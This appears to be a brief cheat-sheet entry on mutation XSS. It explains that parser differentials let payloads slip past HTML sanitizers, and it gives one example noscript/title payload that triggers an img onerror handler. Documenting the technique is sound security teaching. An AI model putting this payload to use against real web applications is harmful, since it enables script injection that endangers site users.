# Mutation XSS (mXSS)

## Summary
Exploit parser differentials between the HTML parser and the DOM API.

## Technique
Craft payloads that bypass sanitization by being mutated during re-parsing.

## Example
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
